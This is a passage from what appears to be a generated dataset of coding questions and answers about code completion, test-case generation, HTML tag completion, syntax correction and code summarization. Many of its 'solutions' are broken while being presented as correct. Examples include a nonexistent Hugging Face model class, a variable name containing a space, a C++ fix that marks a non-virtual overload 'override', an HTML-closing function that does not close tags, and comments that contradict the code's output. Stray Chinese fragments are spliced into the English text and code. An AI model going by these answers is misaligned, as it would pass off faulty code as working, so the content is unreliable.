1:\nProblem: Develop a code completion tool that, given a partially typed method signature in Java, suggests the correct method signature based on existing methods in the same class. The tool should account for return type, method name, and parameters.\n\nSolution:\nConcept: \"Code completion\", \"Method signature completion\"\n\n```java\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class CodeCompletionTool {\n\n    public static List<String> suggestMethodSignatures(String className, String prefix) {\n        List<String> suggestions = new ArrayList<>();\n        // Assume 'className' exists and has been loaded by the class loader\n        Class<?> clazz = Class.forName(className);\n        for (Method method : clazz.getMethods()) {\n            if (method.getName().startsWith(prefix)) {\n                StringBuilder signature = new StringBuilder();\n                signature.append(method.getReturnType().getSimpleName()).append(\" \");\n                signature.append(method.getName()).append(\"(\");\n                for (int i = 0; i < method.getParameterCount(); i++) {\n                    if (i > 0) {\n                        signature.append(\", \");\n                    }\n                    signature.append(method.getParameters()[i].getType().getSimpleName());\n                }\n                signature.append(\")\");\n                suggestions.add(signature.toString());\n            }\n        }\n        return suggestions;\n    }\n\n    public static void main(String[] args) {\n        String className = \"com.example.MyClass\";\n        String prefix = \"foo\";\n        List<String> suggestions = suggestMethodSignatures(className, prefix);\n        for (String suggestion : suggestions) {\n            System.out.println(suggestion);\n        }\n    }\n}\n```\n\nQuestion 2:\nProblem: Implement a Python code completion feature for a text editor that predicts the argument names and default values for a partially typed function call based on the function's definition in the current script.\n\nSolution:\nConcept: \"Code completion\", \"Method signature completion\"\n\n```python\nimport ast\nimport textwrap\n\ndef predict_function_arguments(script_text, function_name, cursor_position):\n    class ArgumentPredictor(ast.NodeVisitor):\n        def visit_FunctionDef(self, node):\n            if node.name == function_name:\n                argument_predictions = []\n                for arg in node.args.args:\n                    argument_predictions.append(arg.arg)\n                    if arg.default is not None:\n                        argument_predictions[-1] += \" = \" + ast.literal_eval(arg.default)\n                return argument_predictions\n\n    tree = ast.parse(textwrap.dedent(script_text))\n    predictor = ArgumentPredictor()\n    predictor.visit(tree)\n    \n    function_def = predictor.visit(tree)\n    if function_def is None:\n        return []\n    return function_def\n\nscript = \"\"\"\ndef foo(a, b=10, c='default'):\n    pass\n\n# User types: foo(1, <cursor>\n\"\"\"\n\ncursor_position = len(\"foo(1, \")\narguments = predict_function_arguments(script, \"foo\", cursor_position)\nprint(\"Predicted arguments:\", arguments)\n```\nIn both solutions, the code completion tool analyzes the existing codebase to suggest method or function signatures, providing a medium complexity solution for method signature completion in the respective languages (Java and Python)."}, {"L2_TASK": "Code completion", "L3_TASK": "Method signature completion", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a predictive code completion system that utilizes advanced natural language processing (NLP) and deep learning techniques to provide accurate method signature completions for a given partially typed code snippet in Python.\n\nProblem:\nDeveloping a code completion system that can accurately predict method signatures based on the context and syntax of the partially written code is a complex task. The system should understand the semantic meaning of the code, handle various Python language features, and learn from a large corpus of Python code to generate relevant suggestions.\n\nSolution:\nOne possible solution involves creating a deep learning model, such as a transformer-based language model, fine-tuned on a large dataset of Python source code. The model should be able to understand the code context and predict the most likely method signature for the ongoing function call.\n\nExample (using Python and Hugging Face's Transformers library):\n\n```python\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForCodeCompletion\n\ntokenizer = AutoTokenizer.from_pretrained(\"your-pretrained-model\")\nmodel = AutoModelForCodeCompletion.from_pretrained(\"your-pretrained-model\")\n\ndef predict_method_signature(code_snippet):\n    # Tokenize the code snippet\n    input_ids = tokenizer.encode(code_snippet + \"[COMPLETION]\", return_tensors=\"pt\")\n    \n    # Perform masked language modeling\n    masks = torch.tensor([[0] * len(code_snippet) + [1], *input_ids[0]]).unsqueeze(0)\n    outputs = model(input_ids, masked_lm_labels=masks)\n    loss, logits = outputs.loss, outputs.logits.squeeze(0)\n    \n    # Get the most probable completion\n    predicted Completion = tokenizer.decode(torch.argmax(logits, dim=-1)[1:])\n    \n    return predicted Completion\n\n# Example usage\ncode_snippet = \"def calculate_area(rectangle):\\n    width = 5\\n    height = 10\\n    area = rectangle.\"\ncompletion = predict_method_signature(code_snippet)\nprint(completion)  # Expected output: \".__init__(self, width, height)\"\n```\n\nQuestion 2: Design a real-time, collaborative code completion engine for a web-based IDE that uses GraphQL to fetch relevant method signatures from a remote server. The engine should handle concurrent users, maintain consistency, and minimize latency.\n\nProblem:\nThis problem involves creating a distributed system that provides code completion suggestions in a web-based IDE, where multiple users can simultaneously work on the same codebase. The system must handle concurrent requests, maintain data consistency, and deliver low-latency responses to ensure a seamless user experience.\n\nSolution:\nTo address this problem, we can create a client-side component that communicates with a GraphQL server using subscriptions. The server will maintain a cache of code metadata and update it whenever a user makes changes. The client will receive updates in real-time and incorporate them into the code completion suggestions.\n\nExample (using JavaScript, Apollo Client, and GraphQL):\n\n```javascript\nimport { useSubscription, gql } from '@apollo/client';\n\nconst CODE_COMPLETION_SUBSCRIPTION = gql`\n  subscription CodeCompletion($codeId: ID!) {\n    codeCompletion(codeId: $codeId) {\n      functionName\n      parameters\n    }\n  }\n`;\n\nfunction CodeEditor({ codeId }) {\n  const { loading, error, data } = useSubscription(CODE_COMPLETION_SUBSCRIPTION, {\n    variables: { codeId },\n  });\n\n  if (loading) return 'Loading...';\n  if (error) return `Error! ${error.message}`;\n\n  // Assuming we have a code editor component that accepts suggestions\n  const provideSuggestions = (cursorPosition) => {\n    const relevantCompletion = data.codeCompletion.find(\n      (completion) => completion.functionName.startsWith(cursorPosition.functionName)\n    );\n    editor.updateSuggestions(relevantCompletion.parameters);\n  };\n\n  return (\n    <div>\n      <CodeEditorComponent onCursorPositionChange={provideSuggestions} />\n    </div>\n  );\n}\n\n// On the server-side (e.g., in a Node.js express-graphql setup)\nconst typeDefs = gql`\n  type CodeCompletion {\n    functionName: String!\n    parameters: [String!]!\n  }\n\n  type Subscription {\n    codeCompletion(codeId: ID!): CodeCompletion\n  }\n`;\n\nconst resolvers = {\n  Subscription: {\n    codeCompletion: async (_, { codeId }, { cache, subscriptionData }) => {\n      // Fetch or update code metadata from the cache, database, or any other source\n      const codeMetadata = ...;\n\n      // Publish the updated code completion data to all subscribers\n      cache.writeData({ data: { codeCompletion: codeMetadata } });\n      return codeMetadata;\n    },\n  },\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers });\n```\n\nIn this example, the `CodeEditor` component subscribes to GraphQL for real-time code completion updates. The server fetches or updates code metadata and publishes the changes to all connected clients, ensuring consistent suggestions across the IDE."}, {"L2_TASK": "Code completion", "L3_TASK": "Auto-generate test cases", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: \"Unit Testing\"\n\nProblem: Develop a code completion tool that auto-generates medium-complexity test cases for a given function that calculates the factorial of a non-negative integer using recursion. The tool should create test cases with edge cases and known results.\n\nSolution:\n```python\ndef factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\ndef generate_test_cases():\n    test_cases = [\n        (0, 1),\n        (1, 1),\n        (5, 120),\n        (-1, None),  # Edge case: Negative input\n        (10, 3628800),  # Large number\n        (100, None),  # Overflow edge case\n    ]\n    return test_cases\n\nfor n, expected_result in generate_test_cases():\n    try:\n        result = factorial(n)\n        if expected_result is None:\n            assert result is None\n        else:\n            assert result == expected_result\n        print(f\"Test passed for n={n}, result={result}\")\n    except AssertionError:\n        print(f\"Test failed for n={n}, expected={expected_result}, got={result}\")\n```\nQuestion 2:\nConcept: \"Integration Testing\"\n\nProblem: Create a code completion tool that auto-generates medium-complexity test cases for a REST API client function that fetches user data from a server. The tool should test different scenarios like successful requests, error handling, and paginated responses.\n\nSolution:\n```python\nimport requests\nfrom unittest.mock import patch\n\ndef fetch_user_data(user_id, page_size=10, page_number=1):\n    url = f\"https://api.example.com/users/{user_id}?page_size={page_size}&page={page_number}\"\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None\n\ndef generate_test_cases():\n    test_cases = [\n        (1, 2, {'status': 'success', 'data': [{'id': 1}, {'id': 2}]}),\n        (1, 10, {'status': 'success', 'data': [{'id': 1}, {'id': 2}, {'id': 3}, {'id': 4}, {'id': 5}, {'id': 6}, {'id': 7}, {'id': 8}, {'id': 9}, {'id': 10}]}),\n        (1, 10, 2, {'status': 'success', 'data': [{'id': 11}, {'id': 12}, {'id': 13}, {'id': 14}, {'id': 15}, {'id': 16}, {'id': 17}, {'id': 18}, {'id': 19}, {'id': 20}]}),\n        (1, -1, None),  # Edge case: Invalid page size\n        (999, 10, None),  # Edge case: Non-existent user\n        (1, 10, 100, None)  # Edge case: Invalid page number\n    ]\n    return test_cases\n\nfor user_id, page_size, page_number, expected_result in generate_test_cases():\n    with patch('requests.get') as mock_request:\n        mock_request.return_value.json.return_value = expected_result\n        mock_request.return_value.status_code = 200 if expected_result else 404\n\n        result = fetch_user_data(user_id, page_size, page_number)\n\n        if expected_result is None:\n            assert result is None\n        else:\n            assert result == expected_result\n            assert mock_request.called_with(f\"https://api.example.com/users/{user_id}?page_size={page_size}&page={page_number}\")\n```\nIn both examples, the code completion tool generates test cases for provided functions or APIs, considering edge cases and expected results, making the testing process more efficient and comprehensive."}, {"L2_TASK": "Code completion", "L3_TASK": "Auto-generate test cases", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGenerate a problem where an AI system needs to automatically create comprehensive and diverse test cases for a complex sorting algorithm, such as the merge sort, with an input of large datasets, dealing with edge cases, and ensuring the stability of the algorithm.\n\nProblem:\nDevelop a code completion tool that, given a custom implementation of the merge sort algorithm, generates a diverse set of test cases to thoroughly validate its correctness. The test cases should include large datasets, edge cases (e.g., already sorted arrays, reverse sorted arrays, and nearly sorted arrays), and random datasets. The tool must also ensure that the merge sort algorithm maintains stability.\n\nSolution:\nConcept: \"Testing Framework\" (e.g., Python's `unittest`), \"Data Generation\", \"Merge Sort\"\n\n```python\nimport unittest\nimport random\nfrom custom_merge_sort import merge_sort\n\nclass TestMergeSort(unittest.TestCase):\n    def generate_random_array(self, size, min_val, max_val):\n        return [random.randint(min_val, max_val) for _ in range(size)]\n\n    def test_merge_sort(self):\n        # Test case 1: Empty array\n        self.assertEqual(merge_sort([]), [])\n\n        # Test case 2: Single element array\n        self.assertEqual(merge_sort([5]), [5])\n\n        # Test case 3: Already sorted array\n        self.assertEqual(merge_sort([1, 2, 3, 4, 5]), [1, 2, 3, 4, 5])\n\n        # Test case 4: Reverse sorted array\n        self.assertEqual(merge_sort([5, 4, 3, 2, 1]), [1, 2, 3, 4, 5])\n\n        # Test case 5: Nearly sorted array\n        self.assertEqual(merge_sort([1, 3, 2, 5, 4]), [1, 2, 3, 4, 5])\n\n        # Test case 6: Large dataset\n        large_data = self.generate_random_array(1000, -1000, 1000)\n        sorted_large_data = sorted(large_data)\n        self.assertEqual(merge_sort(large_data), sorted_large_data)\n\n        # Test case 7: Edge cases\n        for _ in range(10):\n            data = self.generate_random_array(100, -1000, 1000)\n            self.assertEqual(merge_sort(data), sorted(data))\n\nif __name__ == '__main__':\n    unittest.main()\n```\n\nQuestion 2:\nGiven a complex recursive function for parsing a nested JSON object, develop an AI-assisted code completion system that can generate a suite of test cases to identify potential bugs, performance issues, and handle cases with deeply nested or circular references within the JSON structure.\n\nProblem:\nCreate a code completion tool that, when presented with a custom recursive function for parsing JSON, automatically generates various JSON structures, including deeply nested objects, circular references, and large arrays, to test the function's robustness, efficiency, and ability to handle edge cases.\n\nSolution:\nConcept: \"Testing Framework\" (e.g., JavaScript's `jest`), \"Data Generation\", \"JSON\", \"Recursion\"\n\n```javascript\nconst parseJson = require('./custom_json_parser');\n\nfunction generateRandomJson(depth, maxDepth, maxArrayLength) {\n  if (depth > maxDepth) return {};\n  const obj = {};\n  const keys = Array.from({ length: Math.floor(Math.random() * 10) + 1 }).map(() => Math.random().toString(36).substring(7));\n  keys.forEach(key => {\n    if (Math.random() < 0.3) {\n      obj[key] = Math.random().toString(36).substring(7);\n    } else if (Math.random() < 0.5) {\n      obj[key] = Math.floor(Math.random() * maxArrayLength);\n    } else {\n      obj[key] = generateRandomJson(depth + 1, maxDepth, maxArrayLength);\n    }\n  });\n  return obj;\n}\n\ndescribe('parseJson', () => {\n  test('Handles empty JSON', () => {\n    expect(parseJson({})).toEqual({});\n  });\n\n  test('Handles deeply nested JSON', () => {\n    const deepJson = generateRandomJson(0, 10, 100);\n    expect(parseJson(deepJson)).toEqual(deepJson);\n  });\n\n  test('Identifies circular references', () => {\n    const obj = {};\n    obj\u5faa\u73af = obj;\n    expect(() => parseJson(obj)).toThrow('Circular reference detected');\n  });\n\n  test('Handles large arrays', () => {\n    const largeArrayJson = { array: Array.from({ length: 10000 }).fill('value') };\n    expect(parseJson(largeArrayJson)).toEqual(largeArrayJson);\n  });\n});\n\n```\nIn both solutions, the code completion tool is simulated by the manually created test cases. In an actual AI implementation, the tool would generate these test cases automatically based on the given function's input requirements and complexity."}, {"L2_TASK": "Code completion", "L3_TASK": "Complete HTML tags", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are working on an HTML page, and you need to dynamically complete opening and closing tags based on user input. The user will provide the opening tag, and your function should return the correctly paired closing tag. Write a JavaScript function that accomplishes this.\n\n```javascript\nfunction completeTag(openingTag) {\n  // Your code here\n}\n\nconsole.log(completeTag('img')); // Should output: </img>\nconsole.log(completeTag('div')); // Should output: </div>\nconsole.log(completeTag('p'));   // Should output: </p>\n```\n\nSolution:\n```javascript\nfunction completeTag(openingTag) {\n  const voidTags = ['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'param', 'source', 'track', 'wbr'];\n  if (voidTags.includes(openingTag.toLowerCase())) {\n    return '';\n  } else {\n    return `</${openingTag}>`;\n  }\n}\n\nconsole.log(completeTag('img')); // Should output: </img>\nconsole.log(completeTag('div')); // Should output: </div>\nconsole.log(completeTag('p'));   // Should output: </p>\n```\n\nConcept: Tag completion in HTML\n\nQuestion 2:\nProblem: Given a partially written HTML document, you need to find and complete all unclosed tags in the document. Write a Python function that takes a string of HTML as input and returns a corrected HTML string with all tags properly opened and closed.\n\n```python\ndef complete_html_document(html):\n  # Your code here\n  return corrected_html\n\nhtml_input = '<html><head><title>My Page</title></head><body><h1>Welcome</body></html>'\n\nprint(complete_html_document(html_input))\n# Expected output: '<html><head><title>My Page</title></head><body><h1>Welcome</h1></body></html>'\n```\n\nSolution:\n```python\nfrom bs4 import BeautifulSoup\n\ndef complete_html_document(html):\n    soup = BeautifulSoup(html, 'html.parser')\n    for tag in soup.find_all(True):\n        if not tag.attrs and not tag.string and tag.name != 'html':\n            tag.append('</' + tag.name + '>')\n    corrected_html = str(soup)\n    return corrected_html\n\nhtml_input = '<html><head><title>My Page</title></head><body><h1>Welcome</body></html>'\n\nprint(complete_html_document(html_input))\n# Expected output: '<html><head><title>My Page</title></head><body><h1>Welcome</h1></body></html>'\n```\n\nConcept: BeautifulSoup for HTML parsing and manipulation"}, {"L2_TASK": "Code completion", "L3_TASK": "Complete HTML tags", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a code completion tool that predicts and auto-completes complex HTML5 tags with attributes, including nested tags and inline CSS, while maintaining syntax correctness and handling unclosed tags. The tool should be able to handle a large corpus of HTML documents and suggest completions based on context.\n\n**Concept**: Web Development, HTML/CSS\n\nSolution:\n\n```python\nimport re\nfrom collections import defaultdict\nfrom html.parser import HTMLParser\n\nclass HTMLCorpus:\n    def __init__(self, corpus_path):\n        self.corpus_path = corpus_path\n        self.corpus = self._load_corpus()\n        self.tag_freq = defaultdict(int)\n        self.tag_relations = defaultdict(set)\n        self._parse_corpus()\n\n    def _load_corpus(self):\n        with open(self.corpus_path, 'r') as f:\n            return f.read()\n\n    def _parse_corpus(self):\n        class CustomHTMLParser(HTMLParser):\n            def handle_starttag(self, tag, attrs):\n                self.tag_freq[tag] += 1\n                self.tag_relations[self.current_tag].add(tag)\n                self.current_tag = tag\n\n            def handle_endtag(self, tag):\n                self.current_tag = self.tag_relations[self.current_tag].pop()\n\n        parser = CustomHTMLParser()\n        parser.current_tag = ''\n        parser.feed(self.corpus)\n\n    def suggest_completions(self, prefix, context=None):\n        if context is None:\n            context = self.current_tag\n        matching_tags = [tag for tag in self.tag_freq if tag.startswith(prefix)]\n        if context:\n            matching_tags = [tag for tag in matching_tags if tag in self.tag_relations[context]]\n        return sorted(matching_tags, key=lambda x: -self.tag_freq[x])\n\nclass HTMLAutocomplete:\n    def __init__(self, corpus):\n        self.corpus = corpus\n        self.completion_prefix = ''\n        self.context = None\n\n    def get_completion(self, input_text):\n        self.completion_prefix, self.context = self._parse_input(input_text)\n        completions = self.corpus.suggest_completions(self.completion_prefix, self.context)\n        if completions:\n            return f'{completions[0]} {self._generate_attributes()}></{completions[0]}>'\n        else:\n            return None\n\n    def _parse_input(self, input_text):\n        match = re.match(r'<([a-z][a-z0-9]*)\\b', input_text)\n        if match:\n            return match.group(1), None\n        else:\n            open_tag = input_text.rsplit('>', 1)[0].strip()\n            match = re.match(r'<([a-z][a-z0-9]*)\\b', open_tag)\n            return match.group(1), open_tag\n\n    def _generate_attributes(self):\n        # This function can be extended to generate realistic attributes and CSS styles\n        return 'style=\"color: blue; font-size: 16px;\"'\n\n# Usage:\ncorpus = HTMLCorpus('large_html_corpus.html')\nautocomplete = HTMLAutocomplete(corpus)\ninput_text = '<div class=\"container\">'\ncompletion = autocomplete.get_completion(input_text)\nprint(completion)  # Output: <div class=\"container\" style=\"color: blue; font-size: 16px;\"></div>\n```\n\nQuestion 2: Implement a real-time HTML code completion extension for a browser IDE that integrates with a collaborative code editing service. The extension should provide intelligent suggestions based on the document's syntax state, handle multiple cursors, and communicate with the server to synchronize completions across multiple users.\n\n**Concept**: Web Development, HTML/CSS, Real-time Communication\n\nSolution:\nThis is a high-level description of the solution, as the actual implementation would involve multiple components and a more detailed design.\n\n1. **Backend**: A server for handling user connections, storing documents, and facilitating real-time collaboration. It should have an API for receiving cursor positions and fetching document states.\n\n2. **Frontend**: A browser extension that integrates with the IDE and communicates with the backend server.\n\t* Implement an HTML parser to maintain the current syntax state.\n\t* Add event listeners to track cursor movements and selections.\n\t* On cursor movement, send the cursor position and a context window to the server.\n\t* Use the `HTMLCorpus` and `HTMLAutocomplete` classes from the previous solution to generate completions.\n\t* Apply the completions in the editor and update the cursor position.\n\n3. **Real-time Synchronization**: When a user accepts a completion, send the update to the server, which will broadcast the change to all connected users.\n\nThis solution requires a combination of frontend (JavaScript) and backend (e.g., Node.js) technologies, as well as real-time communication libraries like WebSockets. The actual code is beyond the scope of this response due to the complexity involved."}, {"L2_TASK": "Code completion", "L3_TASK": "Syntax correction", "Complexity_Level": "medium", "Response": "Question 1: A programmer is writing a Python function to calculate the factorial of a number but has made some syntax errors. Identify and correct the errors to make the function work correctly.\n\nProblematic Code:\n```python\ndef factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * facotrrial(n - 1)\n```\n\nSolution:\n```python\ndef factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n - 1)  # Fixed typo: 'facotrrial' to 'factorial'\n```\nConcept: Syntax correction\n\nQuestion 2: A developer is working on a JavaScript application and has written a function to calculate the sum of an array of numbers, but there's a syntax issue preventing it from running correctly. Identify and fix the error.\n\nProblematic Code:\n```javascript\nfunction sumArray(arr) {\n  let total = 0\n  for (let i = 0; i < arr.lengt; i++) {\n    total += arr[i];\n  }\n  console.log(total);\n}\nsumArray([1, 2, 3, 4, 5]);\n```\n\nSolution:\n```javascript\nfunction sumArray(arr) {\n  let total = 0;\n  for (let i = 0; i < arr.length; i++) {  // Fixed typo: 'lengt' to 'length'\n    total += arr[i];\n  }\n  console.log(total);\n}\nsumArray([1, 2, 3, 4, 5]);\n```\nConcept: Syntax correction"}, {"L2_TASK": "Code completion", "L3_TASK": "Syntax correction", "Complexity_Level": "extremely difficult", "Response": "Question 1: Given an incomplete and erroneous piece of C++ code with a complex syntax issue involving templates, inheritance, and polymorphism, correct the syntax and ensure the code functions as intended. The code should have a base class with a virtual function, a derived class with a template function that overrides the base class's virtual function, and a client code that instantiates and uses the derived class with different data types.\n\n```cpp\n#include <iostream>\n\nclass Base {\npublic:\n    virtual ~Base() {}\n    template <typename T>\n    void process(T value) {\n        std::cout << \"Base: \" << value << std::endl;\n    }\n};\n\nclass Derived : public Base {\npublic:\n    template <typename T>\n    void process(T value) override {\n        std::cout << \"Derived: \" << value * value << std::endl;\n    }\n};\n\nint main() {\n    Derived d;\n    d.process(\"Hello\"); // Incorrect usage, should work with integers and floating-point numbers\n    return 0;\n}\n```\n\nSolution:\n\n```cpp\n#include <iostream>\n\nclass Base {\npublic:\n    virtual ~Base() {}\n    virtual void process(int value) = 0; // Change to non-template function\n    void process(float value) override { this->process(static_cast<int>(value)); } // Forward to the int version\n};\n\nclass Derived : public Base {\npublic:\n    void process(int value) override {\n        std::cout << \"Derived: \" << value * value << std::endl;\n    }\n};\n\nint main() {\n    Derived d;\n    d.process(5); // Correct usage with integer\n    d.process(3.5f); // Correct usage with float, automatically forwarded to the integer version\n    return 0;\n}\n```\n\nIn this solution, the `Base` class now has a non-template `process` function that is marked as `virtual` and pure. The `Derived` class only overrides this specific function. The `Base` class also has a separate `process` function for `float` values, which forwards the call to the `int` version. This way, the derived class's function is correctly overridden, and the client code can use both integers and floats.\n\nQuestion 2: Write a faulty Python script using higher-order functions and list comprehensions to process a list of dictionaries. The script should have a bug that prevents it from correctly filtering and transforming the data. Your task is to identify the issue, correct the syntax, and provide an explanation for the fix.\n\n```python\ndata = [\n    {'name': 'Alice', 'age': 25, 'is_student': True},\n    {'name': 'Bob', 'age': 30, 'is_student': False},\n    {'name': 'Charlie', 'age': 22, 'is_student': True},\n]\n\ndef filter_students_and_format(people):\n    return [student['name'].upper() for student in people if student['is_student'] == 'True']\n\nresult = filter_students_and_format(data)\nprint(result)\n```\n\nSolution:\n\n```python\ndata = [\n    {'name': 'Alice', 'age': 25, 'is_student': True},\n    {'name': 'Bob', 'age': 30, 'is_student': False},\n    {'name': 'Charlie', 'age': 22, 'is_student': True},\n]\n\ndef filter_students_and_format(people):\n    return [student['name'].upper() for student in people if student['is_student']]\n\nresult = filter_students_and_format(data)\nprint(result)\n```\n\nThe issue in the original code is that the condition `student['is_student'] == 'True'` is comparing a boolean value with a string literal. In Python, boolean values are not the same as their string representations. The fix is to remove the quotes around `True`, so the condition correctly checks the boolean value of `is_student`. The corrected list comprehension now filters and transforms the data as expected."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Summarize this file / script / repository in a paragraph (or 5 bullets)", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Code Summarization\n\nProblem: Given a Python script `script.py` that implements a text processing pipeline, summarize its main functionality in a brief paragraph.\n\n```python\ndef read_data(file_path):\n    with open(file_path, 'r') as f:\n        data = f.read().splitlines()\n    return data\n\ndef preprocess_text(data):\n    cleaned_data = []\n    for line in data:\n        line = line.strip().lower()\n        cleaned_data.append(line)\n    return cleaned_data\n\ndef tokenize(text_data):\n    tokens = [word for line in text_data for word in line.split()]\n    return tokens\n\ndef main():\n    input_file = 'input.txt'\n    output_file = 'output.txt'\n    data = read_data(input_file)\n    preprocessed_data = preprocess_text(data)\n    tokens = tokenize(preprocessed_data)\n    with open(output_file, 'w') as f:\n        f.write(' '.join(tokens))\n\nif __name__ == \"__main__\":\n    main()\n```\n\nSolution:\nThe `script.py` file contains a text processing pipeline. It begins by reading input from a text file (`input.txt`) using the `read_data()` function, which splits the content into lines. The `preprocess_text()` function cleans the data by converting it to lowercase and removing leading/trailing whitespaces. Next, `tokenize()` breaks the preprocessed text into individual words. The main function, `main()`, orchestrates these steps, writing the tokenized output to `output.txt`.\n\nQuestion 2:\nConcept: Code Summarization\n\nProblem: Summarize the functionality of a Git repository containing a JavaScript web application with React and Redux in five bullet points.\n\n`README.md`:\n\n```\n# MyWebApp\nA simple to-do list application built with React and Redux.\n\n## Features\n- User can add, edit, and delete tasks\n- Tasks are stored in local storage for persistence\n- Task filtering and sorting options\n- Responsive design for mobile and desktop\n- Dark mode toggle\n\n## Technologies\n- React for UI components\n- Redux for state management\n- Redux-Thunk for async actions\n- Jest and Enzyme for testing\n- Bootstrap for styling\n```\n\n`package.json`:\n\n```json\n{\n  \"name\": \"mywebapp\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A simple to-do app\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"react-scripts start\",\n    \"build\": \"react-scripts build\",\n    \"test\": \"jest\",\n    \"eject\": \"react-scripts eject\"\n  },\n  \"dependencies\": {\n    \"react\": \"^17.0.2\",\n    \"react-dom\": \"^17.0.2\",\n    \"react-redux\": \"^7.2.6\",\n    \"redux\": \"^4.1.2\",\n    \"redux-thunk\": \"^2.4.1\"\n  },\n  \"devDependencies\": {\n    \"bootstrap\": \"^5.1.3\",\n    \"enzyme\": \"^3.11.0\",\n    \"enzyme-adapter-react-16\": \"^1.15.6\",\n    \"jest\": \"^27.4.5\",\n    \"react-bootstrap\": \"^2.2.2\",\n    \"react-scripts\": \"^4.0.3\"\n  }\n}\n```\n\nSolution:\n- The repository contains a web application named \"MyWebApp\" built with React and Redux for a to-do list functionality.\n- It allows users to create, modify, and delete tasks, persisting them using local storage.\n- Task management is enhanced with filtering and sorting options, along with a responsive design\u9002\u5e94\u624b\u673a\u548c\u5e73\u677f\u7535\u8111.\n- The application features a dark mode toggle for user preference.\n- Testing is ensured by Jest and Enzyme, and styling is done using Bootstrap."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Summarize this file / script / repository in a paragraph (or 5 bullets)", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a Python-based code summarization tool that uses advanced Natural Language Processing (NLP) techniques to generate concise yet informative summaries of complex code repositories, including identifying key functions, classes, and dependencies.\n\nConcept: Natural Language Processing, Code Analysis\n\n```python\nimport os\nimport ast\nfrom nltk.tokenize import word_tokenize, sent_tokenize\nfrom nltk.corpus import stopwords\nfrom nltk.stem import PorterStemmer\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.cluster import KMeans\n\ndef summarize_code_repo(repo_path):\n    code_files = [os.path.join(repo_path, f) for f in os.listdir(repo_path) if f.endswith('.py')]\n\n    # Preprocess code files\n    code_summaries = []\n    for file in code_files:\n        with open(file, 'r', encoding='utf-8') as f:\n            code_summary = extract_function_class_info(f.read())\n            code_summaries.append(code_summary)\n    \n    # Combine code summaries and vectorize\n    combined_summary = ' '.join(code_summaries)\n    vectorizer = TfidfVectorizer(stop_words='english', tokenizer=word_tokenize)\n    tfidf_matrix = vectorizer.fit_transform(combined_summary.split('\\n'))\n\n    # Cluster code summaries\n    n_clusters = 5\n    kmeans = KMeans(n_clusters=n_clusters, random_state=42)\n    kmeans.fit(tfidf_matrix)\n\n    # Generate cluster centroids\n    cluster_centroids = kmeans.cluster_centers_\n    cluster_summaries = [vectorizer.inverse_transform([c])[0].strip() for c in cluster_centroids]\n\n    # Postprocess and return summaries\n    stop_words = set(stopwords.words('english'))\n    ps = PorterStemmer()\n    summarized_repo = []\n    for summary in cluster_summaries:\n        words = word_tokenize(summary)\n        filtered_words = [ps.stem(word) for word in words if word.lower() not in stop_words]\n        summarized_repo.append(' '.join(filtered_words))\n\n    return summarized_repo\n\ndef extract_function_class_info(code):\n    tree = ast.parse(code)\n    functions, classes = [], []\n    for node in ast.walk(tree):\n        if isinstance(node, ast.FunctionDef):\n            functions.append(node.name)\n        elif isinstance(node, ast.ClassDef):\n            classes.append(node.name)\n    return f\"Functions: {', '.join(functions)}; Classes: {', '.join(classes)}; Dependencies: [uncovered]\"\n\n# Example usage\nrepo_path = \"./my_repo\"\nsummarized_repo = summarize_code_repo(repo_path)\nprint(\"\\n\".join(summarized_repo))\n```\n\nQuestion 2: Create a Rust library that utilizes Machine Learning to condense large, complex C++ codebases by intelligently identifying and merging redundant or similar code blocks, while preserving functionality.\n\nConcept: Machine Learning, Code Analysis, Code Optimization\n\n```rust\n// Note: Rust does not inherently support Machine Learning libraries like Python does,\n// so this example will be more theoretical and showcases how you might approach the problem.\n\nuse std::fs;\nuse std::io::Read;\nuse std::collections::HashMap;\n\nstruct CodeBlock {\n    text: String,\n    hash: u64,\n}\n\nimpl CodeBlock {\n    fn new(text: String) -> Self {\n        // Hashing function (e.g., SHA-256) to uniquely identify code blocks\n        let hash = 0_u64; // Replace with the actual hash of the text\n        Self { text, hash }\n    }\n\n    fn is_similar(&self, other: &CodeBlock, similarity_threshold: f64) -> bool {\n        // Machine learning similarity function (e.g., using embeddings or AST analysis)\n        // Returns true if code blocks are similar enough\n        false // Replace with the actual similarity check\n    }\n}\n\nfn analyze_codebases(cpp_files: Vec<String>) -> HashMap<u64, Vec<String>> {\n    let mut code_blocks = HashMap::new();\n    for file in cpp_files {\n        let mut file_contents = String::new();\n        fs::File::open(&file).unwrap().read_to_string(&mut file_contents);\n        let code_block = CodeBlock::new(file_contents);\n        code_blocks.entry(code_block.hash).or_insert_with(Vec::new).push(file);\n    }\n    code_blocks\n}\n\nfn merge_similar_blocks(code_blocks: HashMap<u64, Vec<String>>, similarity_threshold: f64) -> Vec<String> {\n    let mut merged_files = Vec::new();\n    for (_, files_with_same_hash) in code_blocks {\n        if files_with_same_hash.len() > 1 {\n            // Merge similar code blocks and generate a new file\n            let merged_file = merge_files(files_with_same_hash);\n            merged_files.push(merged_file);\n        } else {\n            merged_files.extend(files_with_same_hash);\n        }\n    }\n    merged_files\n}\n\nfn merge_files(files: Vec<String>) -> String {\n    // Combine files and optimize/merge similar code blocks\n    let mut merged_content = String::new();\n    // Implement intelligent merging based on ML similarity or AST analysis\n    return merged_content;\n}\n\nfn main() {\n    let cpp_files = vec![\"./cpp_codebase/file1.cpp\", \"./cpp_codebase/file2.cpp\", /* ... */];\n    let similarity_threshold = 